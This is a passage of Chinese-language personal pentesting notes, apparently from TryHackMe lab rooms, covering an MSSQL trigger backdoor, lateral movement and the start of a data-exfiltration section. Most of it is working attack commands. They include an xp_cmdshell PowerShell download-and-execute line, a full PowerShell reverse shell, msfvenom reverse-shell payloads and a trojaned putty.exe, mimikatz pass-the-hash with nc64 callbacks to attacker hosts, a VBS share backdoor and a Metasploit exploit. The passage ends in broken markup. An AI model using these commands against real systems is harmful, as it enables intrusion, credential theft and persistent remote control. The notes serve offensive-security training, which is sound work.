<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line"></span><br><span class="line">GRANT IMPERSONATE ON LOGIN::sa to [Public];</span><br></pre></td></tr></table></figure>

<p>切换到数据库<code>HRDB</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE HRDB</span><br></pre></td></tr></table></figure>

<p>我们的触发器将利用<code>xp_cmdshell</code>执行 Powershell 从攻击者控制的 Web 服务器下载并运行<code>.ps1</code>文件。触发器将配置为 在数据库表<code>INSERT</code>中创建以下内容时执行：<code>Employees``HRDB</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TRIGGER [sql_backdoor4]</span><br><span class="line">ON HRDB.dbo.Employees </span><br><span class="line">FOR INSERT AS</span><br><span class="line"></span><br><span class="line">EXECUTE AS LOGIN = &#x27;sa&#x27;</span><br><span class="line">EXEC master..xp_cmdshell &#x27;Powershell -c &quot;IEX(New-Object net.webclient).downloadstring(&#x27;&#x27;http://10.9.0.87:8000/evilscript.ps1&#x27;&#x27;)&quot;&#x27;;</span><br></pre></td></tr></table></figure>

<p>现在后门已经设置好了，让我们<code>evilscript.ps1</code>在攻击者的机器中创建一个包含 Powershell 反向 shell 的机器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$client = New-Object System.Net.Sockets.TCPClient(&quot;ATTACKER_IP&quot;,4454);</span><br><span class="line"></span><br><span class="line">$stream = $client.GetStream();</span><br><span class="line">[byte[]]$bytes = 0..65535|%&#123;0&#125;;</span><br><span class="line">while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;</span><br><span class="line">    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);</span><br><span class="line">    $sendback = (iex $data 2&gt;&amp;1 | Out-String );</span><br><span class="line">    $sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;</span><br><span class="line">    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);</span><br><span class="line">    $stream.Write($sendbyte,0,$sendbyte.Length);</span><br><span class="line">    $stream.Flush()</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$client.Close()</span><br></pre></td></tr></table></figure>

<p>执行插入语句的时候将会进行</p>
<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="思路表-1"><a href="#思路表-1" class="headerlink" title="思路表"></a>思路表</h3><ol>
<li>远程生成进程（已知管理员账号密码），submit传码（利用管理员凭证），再用runas生成新凭证去操作<ol>
<li>psexec<ul>
<li>需要管理员</li>
</ul>
</li>
<li>winrm<ul>
<li>需要远程管理组</li>
</ul>
</li>
<li>sc.exe<ul>
<li>需要管理员</li>
<li>利用服务关联传上去的文件</li>
</ul>
</li>
</ol>
</li>
<li>wmic，powershell登录wmic，传码，监听<ol>
<li>创建远程服务</li>
<li>创建远程进程</li>
<li>创建计划任务</li>
<li>安装msi包<ul>
<li>调用Win32_Product 类的 Install 方法来触发有效负载</li>
</ul>
</li>
</ol>
</li>
<li>有效身份替换<ol>
<li>拿mimikatz打pth</li>
</ol>
</li>
<li>滥用用户<ol>
<li>共享文件可改，留后门</li>
<li>RDP会话劫持（拿psexec</li>
</ol>
</li>
<li>端口转发<ol>
<li>远程攻击</li>
</ol>
</li>
</ol>
<h3 id="1远程生成进程"><a href="#1远程生成进程" class="headerlink" title="1远程生成进程"></a>1远程生成进程</h3><h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><ul>
<li><strong>所需组成员身份：</strong>管理员</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe</span><br></pre></td></tr></table></figure>

<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><ol>
<li>连接到 Admin$ 共享并上传服务二进制文件。Psexec 使用 psexesvc.exe 作为名称。</li>
<li>连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与关联<code>C:\Windows\psexesvc.exe</code>。</li>
<li>创建一些命名管道来处理 stdin&#x2F;stdout&#x2F;stderr。</li>
</ol>
<h4 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h4><ul>
<li><strong>所需组成员身份：</strong>远程管理用户</li>
</ul>
<h5 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrs.exe -u:Administrator -p:Mypass123 -r:target cmd</span><br><span class="line">#登录</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$username = &#x27;Administrator&#x27;;</span><br><span class="line">$password = &#x27;Mypass123&#x27;;</span><br><span class="line">$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; </span><br><span class="line">$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;</span><br><span class="line">#创建一个 PSCredential 对象</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -Computername TARGET -Credential $credential</span><br><span class="line">#Enter-PSSession cmdlet 创建一个交互式会话</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock &#123;whoami&#125;</span><br><span class="line">#还包括 Invoke-Command cmdlet，它通过 WinRM 远程运行 ScriptBlocks。凭据也必须通过 PSCredential 对象传递：</span><br></pre></td></tr></table></figure>

<h4 id="sc-exe"><a href="#sc-exe" class="headerlink" title="sc.exe"></a>sc.exe</h4><ul>
<li><strong>所需组成员身份：</strong>管理员</li>
<li>不允许我们在命令中指定凭据</li>
</ul>
<p>使用以下命令创建并启动名为“THMservice”的服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe \\TARGET create THMservice binPath= &quot;net user munra Pass123 /add&quot; start= auto</span><br><span class="line">sc.exe \\TARGET start THMservice</span><br></pre></td></tr></table></figure>

<p>要停止并删除该服务，我们可以执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe \\TARGET stop THMservice</span><br><span class="line">sc.exe \\TARGET delete THMservice</span><br></pre></td></tr></table></figure>

<p>远程创建计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /s TARGET /RU &quot;SYSTEM&quot; /create /tn &quot;THMtask1&quot; /tr &quot;&lt;command/payload to execute&gt;&quot; /sc ONCE /sd 01/01/1970 /st 00:00 </span><br><span class="line"></span><br><span class="line">schtasks /s TARGET /run /TN &quot;THMtask1&quot; </span><br></pre></td></tr></table></figure>

<p>我们将计划类型 (&#x2F;sc) 设置为 ONCE，这意味着该任务只在指定的时间和日期运行一次。由于我们将手动运行该任务，因此开始日期 (&#x2F;sd) 和开始时间 (&#x2F;st) 并不重要。</p>
<p>由于系统将运行计划的任务，因此我们无法获得该命令的输出，这是一种盲目攻击。</p>
<p>最后，要删除计划任务，我们可以使用以下命令并自行清理：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /S TARGET /TN &quot;THMtask1&quot; /DELETE /F</span><br></pre></td></tr></table></figure>

<h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.200.100.101 &quot; | sudo tee - a /etc/hosts</span><br></pre></td></tr></table></figure>

<h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><ol>
<li>先下载network的openvpn用上</li>
<li>把dc的域控换dns上<ol>
<li>nm-connection-editor</li>
<li>&#x2F;etc&#x2F;resolv.conf加个dc的nameserver</li>
</ol>
</li>
<li>检测<ol>
<li>ifconfig lateralmovement</li>
</ol>
</li>
</ol>
<h5 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh ZA\\tony.holland@thmjmp2.za.tryhackme.com</span><br><span class="line"></span><br><span class="line">Username: tony.holland Password: Mhvn2334</span><br></pre></td></tr></table></figure>

<p>是假设你有凭证的话能上传</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -c &#x27;put 1qa.exe&#x27; -U t1_leonard.summers -W ZA &#x27;//thmiis.za.tryhackme.com/admin$/&#x27; EZpass4ever</span><br></pre></td></tr></table></figure>

<p>再用刚才web页面生成凭证和给的凭证生成一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers &quot;c:\tools\nc64.exe -e cmd.exe 10.50.98.75 4443&quot;</span><br></pre></td></tr></table></figure>

<p>利用生成的凭证去sc远程创建新服务关联刚才传上去的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe \\thmiis.za.tryhackme.com create THMservice-9963 binPath= &quot;%windir%\1qa.exe&quot; start= auto</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe \\thmiis.za.tryhackme.com start THMservice-9963</span><br></pre></td></tr></table></figure>

<h3 id="2wmic"><a href="#2wmic" class="headerlink" title="2wmic"></a>2wmic</h3><p>生成msi码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi &gt; 1qa.msi</span><br></pre></td></tr></table></figure>

<p>开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>上传</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -c &#x27;put 1qa.msi&#x27; -U t1_corine.waters -W ZA &#x27;//thmiis.za.tryhackme.com/admin$/&#x27; Korine.1994</span><br></pre></td></tr></table></figure>

<p>将有效载荷复制到了 ADMIN$ 共享，因此它将在服务器上的 C:\Windows\ 中可用。</p>
<p>让我们从 Powershell 控制台针对 THMIIS启动WMI会话：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; $username = &#x27;t1_corine.waters&#x27;;</span><br><span class="line"></span><br><span class="line">PS C:\&gt; $password = &#x27;Korine.1994&#x27;;</span><br><span class="line"></span><br><span class="line">PS C:\&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;</span><br><span class="line"></span><br><span class="line">PS C:\&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;</span><br><span class="line"></span><br><span class="line">PS C:\&gt; $Opt = New-CimSessionOption -Protocol DCOM</span><br><span class="line"></span><br><span class="line">PS C:\&gt; $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop</span><br></pre></td></tr></table></figure>

<p>调用Win32_Product类的install方法来触发有效负载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @&#123;PackageLocation = &quot;C:\Windows\1qa.msi&quot;; Options = &quot;&quot;; AllUsers = $false&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3替代身份验证"><a href="#3替代身份验证" class="headerlink" title="3替代身份验证"></a>3替代身份验证</h3><p>原理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用您的SSH会话，使用 mimikatz 提取身份验证材料并针对域用户执行传递哈希、传递票证或传递密钥t1_toby.beck。</span><br><span class="line"></span><br><span class="line">一旦你有了加载了其凭据的命令提示符，就可以使用winrs它连接到 THMIIS 上的命令提示符。由于 t1_toby.beck 的凭据已因任何攻击而注入到你的会话中，因此你可以在不指定任何凭据的情况下使用 winrs，它将使用当前会话中可用的凭据：</span><br></pre></td></tr></table></figure>



<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">#提权</span><br><span class="line">sekurlsa::tickets /export</span><br><span class="line">#导出kerberos票证</span><br><span class="line">token::elevate</span><br><span class="line">#获取本地用户的hex</span><br><span class="line">lsadump::sam</span><br><span class="line">#lsass内存中获取hex，本地登录和最近登录到该机器的任何域用户</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>token::revert</code>重新建立过我们原始的令牌权限，因为尝试使用提升的令牌传递哈希是行不通的。 </p>
<p>执行 PtH 攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:&quot;c:\tools\nc64.exe -e cmd.exe 10.50.98.75 5556&quot;</span><br></pre></td></tr></table></figure>

<p>然后去tools里面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs.exe -r:THMIIS.za.tryhackme.com cmd</span><br></pre></td></tr></table></figure>

<h3 id="kerberos票据获取"><a href="#kerberos票据获取" class="headerlink" title="kerberos票据获取"></a>kerberos票据获取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#先提权</span><br><span class="line">privilege::debug</span><br><span class="line">#导出票</span><br><span class="line">sekurlsa::tickets /export</span><br><span class="line">#票据注入到当前会话</span><br><span class="line">kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi</span><br><span class="line">#检查票据是否注入</span><br><span class="line">klist</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="kerberos从内存获取"><a href="#kerberos从内存获取" class="headerlink" title="kerberos从内存获取"></a>kerberos从内存获取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br><span class="line">#获取加密密钥</span><br></pre></td></tr></table></figure>

<p>根据密码执行命令</p>
<h4 id="rc4"><a href="#rc4" class="headerlink" title="rc4"></a>rc4</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</span><br></pre></td></tr></table></figure>

<h4 id="aes128"><a href="#aes128" class="headerlink" title="aes128"></a>aes128</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</span><br></pre></td></tr></table></figure>

<h4 id="AES256"><a href="#AES256" class="headerlink" title="AES256"></a><strong>AES256</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</span><br></pre></td></tr></table></figure>

<h3 id="pth攻击"><a href="#pth攻击" class="headerlink" title="pth攻击"></a>pth攻击</h3><h4 id="rdp连接"><a href="#rdp连接" class="headerlink" title="rdp连接"></a>rdp连接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH</span><br></pre></td></tr></table></figure>

<h4 id="psexec-1"><a href="#psexec-1" class="headerlink" title="psexec"></a>psexec</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP</span><br></pre></td></tr></table></figure>

<h4 id="WinRM-1"><a href="#WinRM-1" class="headerlink" title="WinRM"></a>WinRM</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH</span><br></pre></td></tr></table></figure>

<h3 id="4滥用用户"><a href="#4滥用用户" class="headerlink" title="4滥用用户"></a>4滥用用户</h3><h4 id="RDP劫持"><a href="#RDP劫持" class="headerlink" title="RDP劫持"></a>RDP劫持</h4><p>用管理员权限开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe -s cmd.exe</span><br></pre></td></tr></table></figure>

<p>查看会话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure>

<p>接管会话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tscon 3 /dest:rdp-tcp#6</span><br><span class="line">这个是id和sessionname</span><br></pre></td></tr></table></figure>

<h4 id="共享文件可写"><a href="#共享文件可写" class="headerlink" title="共享文件可写"></a>共享文件可写</h4><h5 id="vbs"><a href="#vbs" class="headerlink" title=".vbs"></a>.vbs</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% &amp; %tmp%\nc64.exe -e cmd.exe &lt;attacker_ip&gt; 1234&quot;, 0, True</span><br></pre></td></tr></table></figure>

<p>这会将 nc64.exe 从共享复制到用户的工作站<code>%tmp%</code>目录，并在用户打开共享的 VBS 脚本时将反向 shell 发送回攻击者。</p>
<h5 id="exe文件后门你"><a href="#exe文件后门你" class="headerlink" title=".exe文件后门你"></a>.exe文件后门你</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b &quot;\x00&quot; -f exe -o puttyX.exe</span><br></pre></td></tr></table></figure>

<h3 id="5端口转发"><a href="#5端口转发" class="headerlink" title="5端口转发"></a>5端口转发</h3><h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N</span><br></pre></td></tr></table></figure>

<p><code>tunneluser</code>不允许在攻击者电脑上运行 shell，我们需要<code>ssh</code>使用<code>-N</code>开关以阻止客户端请求，否则连接将立即退出。<code>-R</code>switch 用于请求远程端口转发</p>
<p>一旦我们的隧道设置并运行，我们就可以进入攻击者的机器并通过RDP进入转发端口来到达服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword</span><br></pre></td></tr></table></figure>

<h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h4><p>从攻击者的机器转发端口 80 并使其在 PC-1 上可用，我们可以在 PC-1 上运行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N</span><br></pre></td></tr></table></figure>

<p>使用<code>-L</code>本地端口转发选项。此选项要求我们指示 PC-1 用于接收连接的本地套接字 ( <code>*:80</code>) 以及从攻击者的 PC 角度要连接的远程套接字 ( <code>127.0.0.1:80</code>)。</p>
<p><strong>注</strong>我们在第二个套接字中使用 IP 地址 127.0.0.1，因为从攻击者的 PC 角度来看，这是持有要转发的端口 80 的主机。</p>
<p>由于我们在 PC-1 上打开了一个新端口，因此我们可能需要添加防火墙规则以允许传入连接（使用<code>dir=in</code>）。此操作需要管理权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Open Port 80&quot; dir=in action=allow protocol=TCP localport=80</span><br></pre></td></tr></table></figure>

<h4 id="socat-进行端口转发"><a href="#socat-进行端口转发" class="headerlink" title="socat 进行端口转发"></a>socat 进行端口转发</h4><p>在主机上打开端口 1234 并将我们在那里收到的任何连接转发到主机 1.1.1.1 上的端口 4321，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321</span><br></pre></td></tr></table></figure>

<p>这<code>fork</code>选项允许 socat 为每个收到的连接派生一个新进程，从而可以处理多个连接而无需关闭。如果不包含它，socat 将在第一个连接完成时关闭。</p>
<p>如果我们想使用 PC-1 作为枢纽访问服务器上的端口 3389，就像我们使用SSH远程端口转发一样，我们可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389</span><br></pre></td></tr></table></figure>

<h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><h5 id="一有账号密码远程连接"><a href="#一有账号密码远程连接" class="headerlink" title="一有账号密码远程连接"></a>一有账号密码远程连接</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\socat\&gt;socat TCP4-LISTEN:4496,fork TCP4:THMIIS.za.tryhackme.com:3389</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:THMJMP2.za.tryhackme.com:4496 /u:t1_thomas.moore /p:MyPazzw3rd2020</span><br></pre></td></tr></table></figure>

<h5 id="二Rejetto-HFS"><a href="#二Rejetto-HFS" class="headerlink" title="二Rejetto HFS"></a>二Rejetto HFS</h5><p>ssh隧道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ssh tunneluser@10.50.98.75 -R 8888:thmdc.za.tryhackme.com:80 -L *:6609:127.0.0.1:6609 -L *:7809:127.0.0.1:7809 -N</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use rejetto_hfs_exec</span><br><span class="line">set payload windows/shell_reverse_tcp</span><br><span class="line">set lhost thmjmp2.za.tryhackme.com</span><br><span class="line">set ReverseListenerBindAddress 127.0.0.1</span><br><span class="line">set lport 7809 </span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 6609</span><br><span class="line">set rhosts 127.0.0.1</span><br><span class="line">set rport 8888</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<h6 id="报错ssh22端口连不上"><a href="#报错ssh22端口连不上" class="headerlink" title="报错ssh22端口连不上"></a>报错ssh22端口连不上</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status ssh</span><br><span class="line">sudo systemctl start ssh</span><br><span class="line">查看服务，开启服务</span><br></pre></td></tr></table></figure>

<h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h2><h2 id="思路表-2"><a href="#思路表-2" class="headerlink" title="思路表"></a>思路表</h2><ol>
<li><p>tcp套接字</p>
<ul>
<li>nc监听</li>
<li>直接把数据丢到监听端口</li>
<li>加密发送，看的时候解密</li>
</ul>
</li>
<li><p>ssh连接</p>
<ul>
<li>传数据的换成ssh</li>
<li>相当于远程连接，然后把文件丢进去</li>
</ul>
</li>
<li><p>http连接</p>
<ol>
<li>一种是在服务器上开个web服务接收文件</li>
<li>搭建http隧道（用的regeorg）<ul>
<li>把码传到目标服务器，然后连接</li>
</ul>
</li>
</ol>
</li>
<li><p>icmp连接</p>
<ol>
<li>ping的时候带上数据，</li>
<li>工具用<ol>
<li>icmpdoor</li>
<li>msf</li>
</ol>
</li>
</ol>
</li>
<li><p>dns连接，得有域名</p>
<ol>
<li>dns隧道</li>
<li>dns脚本<ul>
<li>放在txt里让受害者执行</li>
</ul>
</li>
<li>dns传数据<ol>
<li>放在子域名上边，单个包255个字符</li>
</ol>
</li>
</ol>
</li>
<li><p>上工具scp</p>
<ol>
<li><pre><code>scp -i /root/.ssh/id_rsa -P 32425 /home/kali/Desktop/JNDIMap-0.0.1.jar mysid@node1.hgame.vidar.club:/tmp
#传文件

scp -r /root/.ssh/id_rsa -P 32425 mysid@mysid@node1.hgame.vidar.club:/app/app.jar ./app.jar
#从服务器考文件
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 